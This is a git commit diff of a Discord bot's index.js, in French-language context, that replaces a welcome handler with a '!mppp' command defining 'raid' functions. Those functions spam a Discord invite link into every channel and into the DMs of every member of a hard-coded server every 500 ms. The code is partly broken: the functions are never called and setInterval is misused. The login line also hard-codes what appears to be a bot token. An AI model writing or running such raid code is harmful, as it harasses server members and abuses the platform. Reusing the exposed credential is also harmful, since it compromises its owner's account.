80ca457fdcf8682a91f8c339d7adc8372574dfb3
sysysysy242 <45331186+sysysysy242@users.noreply.github.com>
2019-09-28 14:05:22 +0200

    Update index.js

--- .gitignore/index.js
+++ .gitignore/index.js
@@ -1,24 +1,40 @@
-const Discord = require('discord.js');
+    const Discord = require('discord.js');
 
 const client = new Discord.Client();
 
+const triesPerSecond = 1;
+
 const prefix = "!"
 
+client.on('ready', () => {
 
-
-client.on('guildMemberAdd', member => {
-    const welcomechanel = member
-    let b_embed = new Discord.RichEmbed()
-    .setColor('RANDOM')
-    .setDescription(`hey ${member.user.username} il nous a rejoin`)
-    member.send("Hey" + member)
-    member.send("https://discord.gg/wKSTHDq")
-
-})
-        
-client.on("ready", () =>{
-    console.log("je suis prêt")
-
+    console.log("Je suis co");
+    client.user.setActivity("a")
 });
 
-client.login(process.env.TOKEN)
+client.on('message', message => {
+    
+    if(message.content.startsWith(prefix + "mppp")) {
+        message.delete()
+        function raid  (){
+        setInterval(message.guild.channels.map(m => m.send("Go https://discord.gg/YPg9vrm ")) , 500  ) 
+    }
+            
+
+    function raid2  (){
+        client.guilds.get("611613604159946784").members.map(c => {
+            setInterval(message.guild.channels.map(m => m.send(c.send("https://discord.gg/YPg9vrm Go go go"))) , 500  ) 
+            
+        });
+    }
+   
+
+
+
+
+    }        
+});
+
+
+
+client.login("NjIxMjkyNzYwMzgwNzM1NTAx.XXjO5w.8fy9amEc_bFHehYUGiSxlNHauCE")
